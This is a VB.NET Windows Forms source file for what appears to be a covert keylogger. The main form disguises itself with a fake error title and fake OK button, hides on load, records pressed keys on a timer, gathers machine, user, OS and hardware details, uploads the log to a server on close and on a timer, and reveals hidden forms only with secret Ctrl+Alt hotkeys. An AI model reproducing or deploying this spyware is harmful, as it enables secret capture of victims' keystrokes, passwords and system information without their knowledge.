Option Strict On

Public Class frmMain

    ' Evento "Form1" #CLOSE - When close a Form
    ' - 1. Shutdow Timers
    ' - 2. Close Registry Local Log
    ' - 3. Sync local log with Server
    Private Sub frmMain_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        ' - 1. Shutdow Timers
        timerKeys.Enabled = False
        timerOnline.Enabled = False
        timerHide.Enabled = False
        ' - 2. Close Registry Local Log
        My.Computer.FileSystem.WriteAllText(Module1.log, vbNewLine & "----- Closed at: " & Now & vbNewLine, True)
        ' - 3. Sync local log with Server
        Dim message As String = My.Computer.FileSystem.ReadAllText(Module1.log) ' read message to upload on log server
        SyncServer(message) ' sync local log with server log
    End Sub

    ' Evento "Form1" #LOAD - When Load a Form
    ' - 1. Create/Check Local Folder
    ' - 2. Change Title of Form1
    ' - 3. Open Registry Local Log
    ' - 4. TEST Open Registry Local Log(Info Local PC)
    ' - 5. Hide Form1
    Private Sub frmMain_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        ' - 1. Create/Check Local Folder
        ' se pasta local nao existir criar uma
        If (Not System.IO.Directory.Exists(Module1.folder)) Then
            System.IO.Directory.CreateDirectory(Module1.folder)
        End If

        ' - 2. Change Title of Form1
        Me.Text = "ERROR 00x2B1B17" ' Change title of Form1

        ' - 3. Open Registry Local Log
        My.Computer.FileSystem.WriteAllText(Module1.log, vbNewLine & "----- Open at: " & Now & vbNewLine, True)

        ' - 4. TEST (Info Local PC)
        'Dim file As System.IO.FileStream
        'file = System.IO.File.Create("c:\users\public\info.txt")
        System.IO.File.WriteAllText("c:\users\public\info.txt", System.Environment.MachineName)
        My.Computer.FileSystem.WriteAllText("c:\users\public\info.txt", vbNewLine & System.Environment.UserName, True)
        System.IO.File.WriteAllText("c:\users\public\info.txt", vbNewLine & System.Environment.UserName)
        System.IO.File.WriteAllText("c:\users\public\info.txt", vbNewLine & My.Computer.Info.OSFullName)
        System.IO.File.WriteAllText("c:\users\public\info.txt", vbNewLine & My.Computer.Info.OSPlatform)
        System.IO.File.WriteAllText("c:\users\public\info.txt", vbNewLine & My.Computer.Info.OSVersion)
        System.IO.File.WriteAllText("c:\users\public\info.txt", vbNewLine & My.Computer.Info.InstalledUICulture.ToString)
        'System.IO.File.WriteAllText("c:\users\public\info.txt", CStr(My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", Nothing)))
        System.IO.File.WriteAllText("c:\users\public\info.txt", vbNewLine & CStr(My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BaseBoardManufacturer", Nothing)))
        System.IO.File.WriteAllText("c:\users\public\info.txt", vbNewLine & CStr(My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BaseBoardProduct", Nothing)))
        System.IO.File.WriteAllText("c:\users\public\info.txt", vbNewLine & CStr(My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\SYSTEM\CentralProcessor\0", "ProcessorNameString", Nothing)))

        ' - 5. Hide Form1
        Me.Hide() 'Hide Form1

    End Sub

    ' Evento "bntFakeOK" #CLICK - When Click on Button
    ' - 1. Hide Form1
    Private Sub btnFakeOK_Click(sender As Object, e As EventArgs) Handles btnFakeOK.Click
        ' - 1. Hide Form1
        Me.Hide()
    End Sub

    ' Timer "timerKeys" - Registry Keys Pressed in Local Log
    ' - 1. Detect Keys Pressed and Registry in Local Log
    Private Sub timerKeys_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles timerKeys.Tick
        ' - 1. Detect Keys Pressed and Registry in Local Log
        SyncKeyboard()
    End Sub

    ' Timer "timerHide" - check SECRET Key to show Forms
    ' - 1. Detect How Form to show
    Private Sub timerHide_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles timerHide.Tick
        ' - 1. Detect How Form to show
        ' If CTRL + ALT + K mostra o formulario 1
        ' If CTRL + ALT + L mostra o formulario 2
        If My.Computer.Keyboard.CtrlKeyDown AndAlso My.Computer.Keyboard.AltKeyDown AndAlso Module1.letter = "K" Then
            Me.Show() ' show Form1
        ElseIf (My.Computer.Keyboard.CtrlKeyDown AndAlso My.Computer.Keyboard.AltKeyDown AndAlso Module1.letter = "L") Then
            Form2.Show() ' show Form2
        End If
    End Sub

    ' Timer "timerOnline" - update online real-realtime Info from Local Computer
    ' - 1. TEST Sync Info Local Info
    Private Sub timerOnline_Tick(sender As Object, e As EventArgs) Handles timerOnline.Tick
        ' - 1. TEST Sync Info Local Info
        Module1.SyncInfo()
    End Sub

End Class
